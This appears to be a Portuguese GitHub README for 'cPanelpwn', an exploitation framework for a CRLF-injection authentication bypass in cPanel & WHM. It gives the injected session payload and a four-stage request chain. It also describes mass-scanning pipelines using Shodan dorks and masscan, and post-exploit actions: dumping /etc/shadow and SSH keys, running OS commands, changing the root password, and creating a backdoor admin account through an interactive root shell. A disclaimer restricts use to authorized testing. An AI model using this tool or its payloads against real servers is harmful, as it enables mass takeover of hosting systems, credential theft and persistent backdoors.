```
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝
██████╗ ██╗    ██╗███╗   ██╗
██╔══██╗██║    ██║████╗  ██║
██████╔╝██║ █╗ ██║██╔██╗ ██║
██╔═══╝ ██║███╗██║██║╚██╗██║
██║     ╚███╔███╔╝██║ ╚████║
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection
  In-The-Wild | CVSS 10.0
```

<p align="center">
  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python" alt="Python"></a>
  <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41940"><img src="https://img.shields.io/badge/CVE--2026--41940-CVSS%3A10.0-red?style=flat-square" alt="CVE"></a>
  <img src="https://img.shields.io/badge/cPanel%20%26%20WHM-Auth%20Bypass-critical?style=flat-square&color=red" alt="cPanel">
  <img src="https://img.shields.io/badge/stdlib%20only-sem%20pip-green?style=flat-square" alt="stdlib">
  <img src="https://img.shields.io/badge/pipeline-ready-blue?style=flat-square" alt="pipeline">
</p>

<p align="center">
  <b>CVE-2026-41940 — Bypass de Autenticação no cPanel & WHM via Injeção CRLF em Arquivo de Sessão</b><br>
  Cadeia de exploit em 4 estágios · Shell WHM interativo · Scanner em massa · Pronto para pipelines · Apenas stdlib Python
</p>

---

## Visão Geral

**cPanelpwn** é um framework de exploração focado na **CVE-2026-41940**, uma vulnerabilidade crítica de bypass de autenticação que afeta o cPanel & WHM. A falha permite que atacantes não autenticados obtenham acesso root ao WHM injetando sequências CRLF no arquivo de sessão através do cabeçalho HTTP `Authorization` — sem nenhuma credencial válida.

- **CVSS:** 10.0 (Crítico)
- **Exploração in-the-wild:** Confirmada (Abril de 2026)
- **Instalações afetadas:** ~70 milhões de domínios rodando cPanel & WHM
- **Sem dependências:** Python stdlib puro — sem pip, sem requests, sem pacotes externos

> **Para uso exclusivo em testes de penetração autorizados e programas de bug bounty.**

---

## Como Funciona

A causa raiz está em `Session.pm`: a função `saveSession()` chama `filter_sessiondata()` **depois** de escrever o arquivo de sessão no disco. Isso significa que caracteres CRLF embutidos no valor do cabeçalho `Authorization: Basic` são gravados literalmente no arquivo de sessão, injetando campos controlados pelo atacante antes que a sanitização ocorra.

```
Fluxo normal:
  POST /login/ → filter_sessiondata() → grava sessão → verifica auth

Fluxo vulnerável:
  POST /login/ → grava sessão (payload CRLF injetado) → filter_sessiondata() → auth lê arquivo envenenado
```

### O Payload CRLF

O valor `Authorization: Basic` decodificado em base64 contém:

```
root:x
successful_internal_auth_with_timestamp=9999999999
user=root
tfa_verified=1
hasroot=1
```

Esses campos são gravados diretamente no arquivo de sessão. Quando relidos pelo cPanel, a sessão é tratada como root autenticado.

### Cadeia de Exploit em 4 Estágios

```
┌─────────────────────────────────────────────────────────────────┐
│  Estágio 0 — Descoberta do Hostname Canônico                    │
│  GET /openid_connect/cpanelid → 307 → hostname real            │
├─────────────────────────────────────────────────────────────────┤
│  Estágio 1 — Criação de Sessão Pré-Auth                        │
│  POST /login/?login_only=1  (credenciais erradas)              │
│  ← 401 + cookie whostmgrsession                                │
├─────────────────────────────────────────────────────────────────┤
│  Estágio 2 — Injeção CRLF                                      │
│  GET / + Cookie: session + Authorization: Basic <payload>      │
│  cpsrvd grava campos CRLF no arquivo de sessão                 │
│  ← 307 Location: /cpsessXXXXXXXXXX/...                        │
├─────────────────────────────────────────────────────────────────┤
│  Estágio 3 — Propagação (gadget do_token_denied)               │
│  GET /scripts2/listaccts                                       │
│  Dispara flush raw→cache — campos injetados tornam-se ativos   │
│  ← 401 Token denied (esperado)                                 │
├─────────────────────────────────────────────────────────────────┤
│  Estágio 4 — Verificação do Acesso Root                        │
│  GET /cpsessXXXXXXXXXX/json-api/version                        │
│  ← 200 {"version":"11.x.x.x","result":1}  = PWNED             │
└─────────────────────────────────────────────────────────────────┘
```

---

## Versões Afetadas

| Branch | Vulnerável | Corrigido em |
|--------|-----------|--------------|
| 110.x | ≤ 11.110.0.96 | **11.110.0.97** |
| 118.x | ≤ 11.118.0.62 | **11.118.0.63** |
| 126.x | ≤ 11.126.0.53 | **11.126.0.54** |
| 132.x | ≤ 11.132.0.28 | **11.132.0.29** |
| 134.x | ≤ 11.134.0.19 | **11.134.0.20** |
| 136.x | ≤ 11.136.0.4  | **11.136.0.5**  |

---

## Instalação

```bash
git clone https://github.com/MateusVerass/cPanelpwn
cd cPanelpwn
python3 cPanelpwn.py --help
```

Não requer instalação de pacotes. Apenas Python 3.8+ puro.

---

## Uso

### Scan Básico

```bash
# Alvo único — apenas scan
python3 cPanelpwn.py -u https://alvo.com:2087

# Alvo único — shell interativo após bypass
python3 cPanelpwn.py -u https://alvo.com:2087 --action shell

# Scan em massa a partir de arquivo
python3 cPanelpwn.py -l alvos.txt -t 20 -o resultados.json

# Relatório HTML com tema escuro
python3 cPanelpwn.py -l alvos.txt -t 20 -o resultados.html
```

### Verificação Passiva de Versão (sem exploit)

```bash
# Checa versão sem tentar o bypass
python3 cPanelpwn.py -u https://alvo.com:2087 --check

# Em massa, quieto, salva resultado
python3 cPanelpwn.py -l alvos.txt --check -q -o check.json
```

### Descoberta de Subdomínios (`--domain`)

```bash
# Descobre subdomínios com cPanel/WHM e escaneia todos
python3 cPanelpwn.py --domain empresa.com.br -t 20

# Com limite de alvos e relatório HTML
python3 cPanelpwn.py --domain empresa.com.br --max-targets 50 -o resultado.html

# Limitar tempo de probe e número de alvos
python3 cPanelpwn.py --domain empresa.com.br --timeout-probe 3 --max-targets 30 -q
```

Fontes de descoberta:
1. **crt.sh** — logs de Certificate Transparency (passivo, sem ruído no alvo)
2. **DNS brute-force** — ~200 prefixos focados em WHM/cPanel
3. **Probe de portas** — testa portas `2087, 2083, 2086, 2082` em ordem, retorna a primeira com resposta WHM

### Reuso de Sessão (`--session` / `--token`)

```bash
# Pula estágios 0-3, vai direto para verificação e ação
python3 cPanelpwn.py -u https://alvo.com:2087 \
  --session "NOME_DA_SESSAO_AQUI" \
  --token "/cpsess1234567890" \
  --action list
```

### Ações Pós-Exploit

```bash
# Listar todas as contas cPanel no servidor
python3 cPanelpwn.py -u https://alvo.com:2087 --action list

# Executar comando do sistema operacional
python3 cPanelpwn.py -u https://alvo.com:2087 --action cmd --cmd "id;whoami;uname -a"
python3 cPanelpwn.py -u https://alvo.com:2087 --action cmd --cmd "ls /home"

# Dump em massa: contas + /etc/shadow + chaves SSH + histórico bash
python3 cPanelpwn.py -u https://alvo.com:2087 --action dump

# Informações do servidor (hostname, carga, disco, MySQL)
python3 cPanelpwn.py -u https://alvo.com:2087 --action info

# Versão do cPanel
python3 cPanelpwn.py -u https://alvo.com:2087 --action version

# Alterar senha root
python3 cPanelpwn.py -u https://alvo.com:2087 --action passwd --passwd 'NovaSenha@2026!'

# Ler arquivo arbitrário
python3 cPanelpwn.py -u https://alvo.com:2087 --action readfile --read-file /etc/shadow

# Criar conta cPanel
python3 cPanelpwn.py -u https://alvo.com:2087 --action adduser \
  --new-user teste --new-domain teste.com --passwd 'Senha@123'

# Criar admin backdoor WHM (reseller com privilégios totais)
python3 cPanelpwn.py -u https://alvo.com:2087 --action addadmin \
  --new-user hax --passwd 'S3cr3t!'

# Shell interativo
python3 cPanelpwn.py -u https://alvo.com:2087 --action shell
```

### `--post-all` — Ação em Todos os Alvos Vulneráveis

```bash
# Escaneia todos e lista contas nos vulneráveis
python3 cPanelpwn.py -l alvos.txt -t 20 --action list --post-all

# Escaneia via --domain e faz dump em todos
python3 cPanelpwn.py --domain empresa.com.br --action dump --post-all
```

### Excludes e Filtros

```bash
# Excluir alvos específicos do scan
python3 cPanelpwn.py -l alvos.txt --exclude ignorar.txt

# ignorar.txt contém hosts/URLs, um por linha:
# 192.168.1.1:2087
# servidor-prod.com
```

### Pipelines

```bash
# subfinder → httpx → cPanelpwn
subfinder -d empresa.com.br -silent | \
  httpx -silent -ports 2087,2086 -threads 50 | \
  python3 cPanelpwn.py -t 30 -o resultado.json

# A partir de lista de escopo
cat escopo.txt | \
  httpx -silent -ports 2087 -threads 100 | \
  python3 cPanelpwn.py -t 30 -o resultado.html

# Resultados do Shodan
shodan search --fields ip_str,port 'title:"WHM Login"' | \
  awk '{print "https://"$1":"$2}' | \
  python3 cPanelpwn.py -t 30 -o shodan.json

# Via stdin direto
echo "https://alvo.com:2087" | python3 cPanelpwn.py

# nmap XML → cPanelpwn
nmap -p 2087 192.168.1.0/24 -oX scan.xml
python3 cPanelpwn.py -l scan.xml -t 20

# masscan JSON → cPanelpwn
masscan 10.0.0.0/8 -p 2087 --rate 10000 -oJ masscan.json
python3 cPanelpwn.py -l masscan.json -t 30 -o resultado.html

# Shodan NDJSON → cPanelpwn
shodan download --limit 1000 'title:"WHM Login"' && shodan parse --fields ip_str,port *.json.gz > shodan.txt
python3 cPanelpwn.py -l shodan.txt -t 20
```

---

## Detecção de WAF/CDN

Antes de executar a cadeia de exploit, o scanner detecta automaticamente proteções WAF/CDN e exibe um aviso:

```
[WARN] WAF/CDN detectado: Cloudflare — bypass pode ser bloqueado
```

WAFs detectados: `Cloudflare`, `Sucuri`, `Incapsula`, `Akamai`, `AWS WAF`, `ModSecurity`, `Barracuda`, `F5 BIG-IP`, `FortiWeb`, `Imperva`.

---

## Formatos de Entrada Suportados

O parâmetro `-l` detecta automaticamente o formato do arquivo:

| Formato | Detecção | Exemplo |
|---------|----------|---------|
| Texto simples | padrão | `https://alvo.com:2087` (um por linha) |
| nmap XML | extensão `.xml` ou tag `<nmaprun` | `nmap -oX scan.xml ...` |
| masscan JSON | começa com `[` | `masscan -oJ out.json ...` |
| Shodan NDJSON | começa com `{` | export do Shodan |

---

## Shell WHM Interativo

Após um bypass bem-sucedido, `--action shell` abre um prompt interativo:

```
════════════════════════════════════════════════════
  WHM Shell — alvo.com
  CVE-2026-41940 | Auth: CRLF bypass | Digite 'help'
════════════════════════════════════════════════════

root@alvo.com ▶ id
  uid=0(root) gid=0(root) groups=0(root)
  hostname: srv01.alvo.com

root@alvo.com ▶ accounts
  user01    domain01.com.br    admin@domain01.com.br
  user02    domain02.net       info@domain02.net
  ...

root@alvo.com ▶ cat /etc/shadow
  root:$6$HASH...

root@alvo.com ▶ dump
  [ACCOUNTS — 47 encontrados]
  [FILE: /etc/shadow]  ...
  [FILE: /root/.ssh/id_rsa]  ...

root@alvo.com ▶ addadmin hax P@ss2026!
  Backdoor admin criado:
  user  : hax
  pass  : P@ss2026!
  login : https://alvo.com:2087/login

root@alvo.com ▶ exit
```

### Comandos do Shell

| Comando | Descrição |
|---------|-----------|
| `id` / `whoami` | UID e hostname |
| `hostname` | Hostname do servidor |
| `version` | Versão do cPanel |
| `info` | Carga, disco, MySQL, versão |
| `accounts` | Lista todas as contas cPanel |
| `dump` | Dump em massa (contas + arquivos sensíveis) |
| `cat <caminho>` | Lê conteúdo de arquivo |
| `ls [caminho]` | Lista diretório |
| `exec <cmd>` | Executa comando do SO |
| `addadmin <user> <senha>` | Cria admin backdoor WHM |
| `passwd <senha>` | Altera senha root |
| `api <endpoint> [k=v ...]` | Chamada raw na API JSON do WHM |
| `help` | Lista todos os comandos |
| `exit` | Sai do shell |

---

## Relatório HTML

Ao salvar com extensão `.html`, um relatório com tema escuro é gerado automaticamente:

```bash
python3 cPanelpwn.py -l alvos.txt -t 20 -o relatorio.html
```

O relatório inclui:
- Caixas de estatísticas (total escaneado, vulneráveis, tempo)
- Cards individuais por alvo com versão, token, URL da API, evidência
- Badge de WAF detectado (quando aplicável)
- Layout responsivo com tema escuro

---

## Referência Completa de Argumentos

```
Target:
  -u, --url URL           Alvo único (ex: https://host:2087)
  -l, --list ARQUIVO      Arquivo de alvos — detecta nmap XML, masscan JSON,
                          Shodan NDJSON ou texto simples automaticamente
  --domain DOMÍNIO        Domínio raiz para descoberta de subdomínios
  --hostname HOST         Forçar cabeçalho Host canônico
  --session COOKIE        Reusar cookie de sessão existente (pula estágios 0-3)
  --token /cpsessXXX      Reusar token cpsess existente (requer --session)
  --exclude ARQUIVO       Arquivo de hosts/URLs para ignorar
  --max-targets N         Limite de alvos após --domain discovery (0 = sem limite)

Scan:
  -t, --threads N         Threads paralelas (padrão: 10)
  --timeout N             Timeout da cadeia de exploit em segundos (padrão: 15)
  --timeout-probe N       Timeout para fase de descoberta/WAF (padrão: 5)
  --retries N             Tentativas por requisição em erro transitório (padrão: 2)
  --rate-limit N          Segundos entre envios de alvos (padrão: 0)
  --proxy URL             Proxy HTTP (ex: http://127.0.0.1:8080)
  --check                 Verificação passiva de versão apenas — sem exploit

Post-Exploit:
  --action AÇÃO           Ação: list | passwd | cmd | exec | info | version |
                                 shell | adduser | addadmin | readfile | dump
  --post-all              Executar --action em TODOS os alvos vulneráveis
  --passwd SENHA          Senha (--action passwd / addadmin)
  --cmd COMANDO           Comando do SO (--action cmd/exec)
  --new-user USUARIO      Usuário (--action adduser / addadmin)
  --new-domain DOMÍNIO    Domínio (--action adduser)
  --read-file CAMINHO     Arquivo a ser lido (--action readfile)

Output:
  -o, --output ARQUIVO    Salvar resultados (.json, .csv ou .html)
  -q, --quiet             Suprimir logs exceto PWNED/CRIT/HIGH
  --no-color              Desativar cores ANSI
```

---

## Dorks do Shodan

```
title:"WHM Login"
title:"WebHost Manager" port:2087
product:"cPanel" port:2087
http.title:"cPanel" port:2083
ssl.cert.subject.cn:"cPanel" port:2087
```

---

## Exemplo de Saída

```
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ...

  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection
  In-The-Wild | CVSS 10.0

14:46:22 [SCAN] Starting exploit chain... https://alvo.com:2087
14:46:22 [WARN] WAF/CDN detectado: Cloudflare — bypass pode ser bloqueado
14:46:23 [INFO] Canonical hostname discovered: srv01.alvo.com
14:46:23 [STEP] Stage 1/4 — Minting preauth session...
14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access! (v11.130.0.6 — CONFIRMADO vulnerável)
14:46:26 [PWND]   Token    : /cpsess8493537756
14:46:26 [PWND]   Session  : :QFB4o8XENBqlr6U1...
14:46:26 [PWND]   Version  : 11.130.0.6
14:46:26 [PWND]   API URL  : https://alvo.com:2087/cpsess8493537756/json-api/version

══════════════════════════════════════════════════════════════════════
  cPanelpwn — CVE-2026-41940 Scan Complete
  Time: 4.2s  ·  Targets: 1

  ⚡ 1 VULNERABLE TARGET(S)

  Target   : https://alvo.com:2087
  Version  : 11.130.0.6
  Token    : /cpsess8493537756
  API URL  : https://alvo.com:2087/cpsess8493537756/json-api/version
══════════════════════════════════════════════════════════════════════
```

---

## Detalhes Técnicos

### Injeção no Arquivo de Sessão

O valor `Authorization: Basic` decodificado contém sequências CRLF que se tornam novas linhas no arquivo de sessão do cPanel:

```
root:x\r\n
successful_internal_auth_with_timestamp=9999999999\r\n
user=root\r\n
tfa_verified=1\r\n
hasroot=1
```

O leitor de sessão do cPanel interpreta esses campos como legítimos, concedendo acesso root total ao WHM.

### Estágio 3 — O Gadget do_token_denied

Passo crítico frequentemente ignorado: após a injeção CRLF (Estágio 2), os dados envenenados existem apenas no **arquivo raw de sessão**. Uma requisição para `/scripts2/listaccts` dispara o handler interno `do_token_denied`, que faz o flush dos dados raw para o **cache de sessão**. Sem esse flush, o Estágio 4 retornaria 403.

### Extração do Token de Sessão

```
Set-Cookie: whostmgrsession=%3aSESSION_NAME%2cOB_HEX; ...
                              ^              ^
                              |              +-- hash ob (descartado)
                              +-- nome da sessão (usado para injeção)
```

### Probe Multi-Porta

A descoberta de subdomínios testa as portas `[2087, 2083, 2086, 2082]` em ordem e retorna a primeira URL com resposta WHM válida, cobrindo instalações cPanel em portas não padrão.

---

## Referências

- [watchTowr Labs — Análise Técnica CVE-2026-41940](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/)
- [cPanel Security Advisory](https://support.cpanel.net/hc/en-us/articles/40073787579671-cPanel-WHM-Security-Update-04-28-2026)
- [NVD — CVE-2026-41940](https://nvd.nist.gov/vuln/detail/CVE-2026-41940)
- [Hadrian Blog — Análise CVE-2026-41940](https://hadrian.io/blog/cve-2026-41940-a-critical-authentication-bypass-in-cpanel)
- [Nuclei Template — CVE-2026-41940](https://cloud.projectdiscovery.io/library/CVE-2026-41940)

---

## Aviso Legal

> Esta ferramenta destina-se **exclusivamente a testes de segurança autorizados** e **programas de bug bounty**. O acesso não autorizado a sistemas computacionais é ilegal. O autor não assume nenhuma responsabilidade pelo uso indevido ou danos causados por esta ferramenta. Sempre obtenha autorização por escrito antes de realizar testes.

